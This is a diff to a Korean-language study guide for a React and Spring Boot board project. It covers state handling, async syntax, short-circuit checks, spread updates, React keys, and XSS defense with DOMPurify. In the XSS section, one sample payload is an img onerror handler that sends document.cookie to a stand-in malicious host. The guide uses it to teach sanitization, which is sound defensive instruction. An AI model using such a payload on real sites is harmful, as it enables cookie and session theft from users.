+        <pre style="margin-top:8px"><code class="language-jsx">// ❌ 피해야 할 패턴 — 로딩과 빈 데이터 구분 불가
+const [post, setPost] = useState({});
+return &lt;h2&gt;{post.title}&lt;/h2&gt;;  // 로딩 중 undefined → 빈 제목 출력
+
+// ✅ 실제 코드 패턴 — null로 명확히 구분
+const [post, setPost] = useState(null);
+return !post ? &lt;div&gt;로딩중...&lt;/div&gt; : &lt;h2&gt;{post.title}&lt;/h2&gt;;</code></pre>
       </div>
+
+      <div class="box tip"><div class="bt">💡 .then().catch() vs async/await — 같은 결과, 다른 문법</div>
+        <p>둘 다 비동기 처리를 하는 동일한 방법입니다. 취향 차이이므로 둘 다 익혀두세요.</p>
+        <pre style="margin-top:8px"><code class="language-jsx">// .then().catch() 체이닝 방식 (이 파일에서 사용)
+postApi.getPost(bno)
+  .then(response => { setPost(response.data.board); })
+  .catch(error  => { console.log(error); });
+
+// async/await 방식 (동일한 동작)
+try {
+  const response = await postApi.getPost(bno);
+  setPost(response.data.board);
+} catch (error) {
+  console.log(error);
+}</code></pre>
+        <p>⚠️ <code>useEffect</code> 콜백은 <code>async</code>를 직접 붙일 수 없습니다. <code>async/await</code>를 쓰려면 내부에 별도 async 함수를 선언 후 호출해야 합니다. 그래서 이 코드에서는 <code>.then()</code> 방식을 선택했습니다.</p>
+      </div>
+
+      <div class="box warn"><div class="bt">⚠️ dangerouslySetInnerHTML + DOMPurify — XSS 공격 방어</div>
+        <p>Quill이 저장한 HTML 문자열을 화면에 출력하려면 React의 <code>dangerouslySetInnerHTML</code>이 필요합니다. 이름 그대로 "위험하게 innerHTML을 쓴다"는 의미입니다.</p>
+        <p><strong>XSS(크로스 사이트 스크립팅)</strong>란 공격자가 게시글 입력란에 악성 스크립트를 심어 다른 사용자의 브라우저에서 실행시키는 공격입니다.</p>
+        <pre style="margin-top:8px"><code class="language-html">&lt;!-- 공격 예시 — 이런 내용이 게시글 content로 저장되었다면? --&gt;
+&lt;img src="x" onerror="document.location='http://악성사이트.com?cookie='+document.cookie"&gt;</code></pre>
+        <p><code>DOMPurify.sanitize()</code>는 위험한 태그/속성을 제거한 뒤 안전한 HTML만 남겨줍니다.</p>
+        <pre style="margin-top:8px"><code class="language-jsx">// ❌ 위험한 코드 — 악성 HTML 그대로 실행
+&lt;div dangerouslySetInnerHTML={{ __html: post.content }}&gt;&lt;/div&gt;
+
+// ✅ 안전한 코드 — DOMPurify로 정화 후 출력
+import DOMPurify from "dompurify";
+&lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}&gt;&lt;/div&gt;</code></pre>
+      </div>
+
+      <div class="box logic"><div class="bt">🟢 && 단락 평가 (Short-Circuit) — isEdit null 에러 방지</div>
+        <p>JavaScript <code>&&</code>는 왼쪽이 <code>falsy</code>이면 오른쪽을 아예 평가하지 않습니다. 이를 이용해 null 상태의 객체 접근 에러를 막습니다.</p>
+        <pre style="margin-top:8px"><code class="language-jsx">const isEdit = user && post && (user.id === post.mid);
+//             ①      ②        ③
+// ① user가 null(비로그인) → isEdit = null(falsy) → 수정/삭제 버튼 숨김
+// ② post가 null(로딩중) → isEdit = null → ③을 평가하지 않아 에러 없음
+// ①②③ 모두 통과 → isEdit = true → 수정/삭제 버튼 표시
+
+// ❌ 이렇게 하면 post가 null일 때 런타임 에러 발생
+const isEdit = user.id === post.mid; // TypeError: Cannot read properties of null</code></pre>
+      </div>
+
+      <div class="box logic"><div class="bt">🟢 ...prev 스프레드 — 상태 부분 업데이트</div>
+        <p><code>setPost(새객체)</code>는 기존 필드를 모두 덮어씁니다. <code>...prev</code>로 기존 값을 먼저 복사하고 바꿀 필드만 덮어써야 title, content 등이 사라지지 않습니다.</p>
+        <pre style="margin-top:8px"><code class="language-jsx">// post = { bno:1, title:'제목', content:'내용', blike:3, bhate:1 }
+
+// ❌ 전체 교체 — title, content 등이 모두 사라짐
+setPost({ blike: 4, bhate: 1 });
+
+// ✅ 부분 업데이트 — 나머지 필드 유지, 카운트만 교체
+setPost(prev => ({
+  ...prev,        // { bno:1, title:'제목', content:'내용', ... } 그대로 복사
+  blike: 4,       // 이 필드만 덮어쓰기
+  bhate: 1
+}));</code></pre>
+      </div>
+
+      <div class="box tip"><div class="bt">💡 key={item.cno || index} — React key 규칙과 fallback 패턴</div>
+        <p>React는 리스트 렌더링 시 각 항목에 고유한 <code>key</code>를 요구합니다. <code>key</code>가 없으면 항목 변경/삭제 시 React가 어떤 DOM을 재사용해야 할지 몰라 버그가 생깁니다.</p>
+        <ul class="tick">
+          <li><strong>이상적인 key</strong>: DB의 고유 ID (<code>item.cno</code>) — 항상 유일하고 안정적</li>
+          <li><strong>fallback key</strong>: <code>item.cno || index</code> — cno가 0이거나 falsy이면 index 사용</li>
+          <li>index만 쓰는 건 순서가 바뀌거나 중간 항목이 삭제될 때 버그 가능 → cno 우선 사용</li>
+        </ul>
+      </div>
+
+      <div class="box alt"><div class="bt">📋 댓글 UI 미완성 항목 (다음 수업 연결 예정)</div>
+        <p>현재 댓글 관련 버튼들은 UI만 있고 API 연결이 안 된 상태입니다.</p>
+        <div class="tablewrap"><table>
+          <thead><tr><th>버튼</th><th>연결할 함수 (예정)</th><th>호출할 API</th><th>상태</th></tr></thead>
+          <tbody>
+            <tr><td>댓글 등록</td><td><code>handleCommentSubmit()</code></td><td><code>commentApi.create()</code></td><td>❌ 미연결</td></tr>
+            <tr><td>댓글 수정</td><td><code>handleCommentEdit(cno)</code></td><td><code>commentApi.update(cno)</code></td><td>❌ 미연결</td></tr>
+            <tr><td>댓글 삭제</td><td><code>handleCommentDelete(cno)</code></td><td><code>commentApi.remove(cno)</code></td><td>❌ 미연결</td></tr>
+            <tr><td>댓글 좋아요</td><td><code>handleCommentReaction(cno,'like')</code></td><td><code>commentApi.reaction()</code></td><td>❌ 미연결</td></tr>
+            <tr><td>댓글 싫어요</td><td><code>handleCommentReaction(cno,'dislike')</code></td><td><code>commentApi.reaction()</code></td><td>❌ 미연결</td></tr>
+          </tbody>
+        </table></div>
+      </div>
+
       <div class="box tip"><div class="bt">💡 왜 Quill CSS를 import하나?</div>
-        <p><code>import "quill/dist/quill.snow.css"</code>를 import하는 이유는 상세 페이지에서 <code>ql-container ql-snow</code> 클래스를 사용해 Quill 에디터에서 작성한 서식(굵기, 목록 등)이 그대로 보이게 하기 위해서입니다.</p>
+        <p>상세 페이지에는 에디터(QuillEditor 컴포넌트)가 없지만 <code>import "quill/dist/quill.snow.css"</code>가 필요합니다. 본문을 감싸는 <code>ql-container ql-snow</code> 클래스가 이 CSS를 참조해서 굵기·색상·목록 등 Quill 서식이 원래대로 표시되기 때문입니다. CSS 없으면 글이 일반 텍스트처럼 보입니다.</p>
       </div>
     </section>
 
@@ -3122,8 +3567,9 @@ const handleCommentUpdate = async (cno) => {
   </div><!-- .content -->
 
   <footer>
-    <p>Step15~17 보안·OAuth2·풀스택 게시판 통합 학습 가이드 · 2026-06-29</p>
+    <p>Step15~17 보안·OAuth2·풀스택 게시판 통합 학습 가이드 · 2026-06-30 (업데이트)</p>
     <p>step17_board_guide.html + SECURITY_STUDY_GUIDE.md 통합 · React + Spring Boot + MySQL · JWT + OAuth2 + MyBatis + JPA</p>
+    <p>추가: board-fk-migration.sql · board_comment_view · BoardCommentMapper 인터페이스 · BoardCommentService · BoardService · GET /api/posts/{bno}</p>
     <p>기준 저장소: nam2626/green-04-spring (커밋 e9600b5)</p>
   </footer>
 </div><!-- .main -->
